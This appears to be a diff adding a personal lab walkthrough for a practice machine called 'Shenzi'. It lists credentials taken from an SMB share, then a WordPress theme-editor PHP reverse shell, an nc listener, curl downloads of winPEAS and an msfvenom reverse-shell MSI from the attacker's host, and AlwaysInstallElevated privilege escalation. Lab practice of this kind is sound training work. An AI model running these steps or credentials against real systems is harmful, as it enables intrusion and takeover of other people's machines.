@@ -1,0 +1,85 @@
+Shenzi
+
+ftp 192.168.57.55
+failed
+
+smbclient \\\\192.168.57.55\\Shenzi
+mget *
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB & lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
+
+5) WordPress:
+   User: admin
+   Password: FeltHeadwallWight357
+
+
+
+http://192.168.57.55/dashboard/phpinfo.php
+\Users\shenzi 
+TEMP 	C:\Users\shenzi\AppData\Local\Temp 
+USERNAME 	shenzi
+USERPROFILE 	C:\Users\shenzi 
+
+http://192.168.57.55/shenzi/wp-login.php?redirect_to=http%3A%2F%2F192.168.57.55%2Fshenzi%2Fwp-admin%2F&reauth=1
+
+loging using given credential
+
+Dashboard>Appearance>Theme Editor
+
+Templet 404
+remove everything 
+
+https://www.revshells.com/ > PHP Ivan Sincek
+
+nc -nvlp 4545
+
+Got shell
+
+https://github.com/peass-ng/PEASS-ng/releases
+winpeasany.exe
+
+curl http://192.168.49.57:8000/winPEASany.exe -o winpeas.exe
+powershell
+./winpeas.exe
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
+AlwaysInstallElevated
+Can run *msi files
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.57 LPORT=4445 -f msi -o shell.msi
+
+curl http://192.168.49.57:8000/shell.msi -o shell.msi
+./shell.msi 
+got root shell
+
+
+
